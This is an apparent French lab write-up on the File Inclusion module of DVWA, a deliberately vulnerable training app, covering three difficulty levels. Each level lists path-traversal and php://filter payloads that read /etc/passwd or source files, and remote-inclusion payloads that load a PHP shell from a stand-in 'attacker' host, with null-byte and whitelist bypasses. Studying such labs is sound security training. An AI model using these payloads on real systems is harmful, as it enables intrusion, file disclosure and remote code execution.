+++
title = "DVWA - File Inclusion"
date = 2025-12-23
categories = ["DVWA"]
description = "Explication technique"


[taxonomies]
tags = ["cybersécurité", "DVWA", "web"]
+++


## Easy
- Aucune restriction : `?page=/etc/passwd` lit le fichier système Linux affichant les hashes utilisateurs.
- Pour Remote file Inclusion (RFI) si `allow_url_include=On` dans `php.ini` : `?page=http://attacker/shell.txt` exécute un shell PHP distant.
- Objectif typique : `?page=../chemin/vers/le/fichier/recherché.txt`.

## Medium
- Strip `../` via `str_replace('../', '', $page)` mais accepte chemins absolus et wrappers PHP.
- LFI : `?page=../../../etc/passwd` (plus de `../` que filtré) ou `?page=php://filter/convert.base64-encode/resource=index.php` pour source encodé.
- RFI : `?page=http://attacker/shell.php%00` (le null byte termine prématurément la concaténation/ termine la chaine de caractère).

## Hard
- Whitelist `file*` ou `include.php` via `preg_match('/^file/', $page)`.
- LFI : `?page=file../../etc/passwd` (wildcard file + path traversal) ou `?page=file.php://filter/read=convert.base64-encode/resource=/etc/passwd`.
- RFI bloqué, mais null byte : `?page=filehttp://attacker/shell.php%00`.
